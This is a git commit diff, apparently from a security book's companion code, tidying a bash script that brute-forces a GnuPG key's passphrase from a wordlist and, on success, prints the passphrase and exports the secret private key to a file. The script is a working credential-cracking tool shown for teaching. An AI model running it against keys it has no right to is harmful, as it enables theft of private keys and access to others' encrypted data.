710f6c588fc173fbbdae5719bb9772307cd36ff2
Dolev Farhi <farhi.dolev@gmail.com>
2023-07-01 21:16:23 -0400

    fix shellcheck

--- ch09/gnupg_passphrase_bf.sh
+++ ch09/gnupg_passphrase_bf.sh
@@ -1,20 +1,23 @@
 #!/bin/bash
 KEY_ID="identity@blackhatbash.com"
 
+if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then
+  echo "Could not find identity/key ID ${KEY_ID}"
+  exit 1
+fi
+
 while read -r passphrase; do
   echo "Brute forcing with ${passphrase}..."
-  echo "${passphrase}" | gpg --batch \
+  if echo "${passphrase}" | gpg --batch \
                              --yes \
                              --pinentry-mode loopback \
                              --passphrase-fd 0 \
                              --output private.pgp \
                              --armor \
-                             --export-secret-key "${KEY_ID}"
-
-  if gpg_exit_code=$?; [ "$gpg_exit_code" -eq 0 ]; then
-    echo "Passphrase is: ${passphrase}"
-    echo "Private key is located at private.pgp"
-    exit 0
+                             --export-secret-key "${KEY_ID}"; then
+      echo "Passphrase is: ${passphrase}"
+      echo "Private key is located at private.pgp"
+      exit 0
   fi
 
 done < passphrases.txt
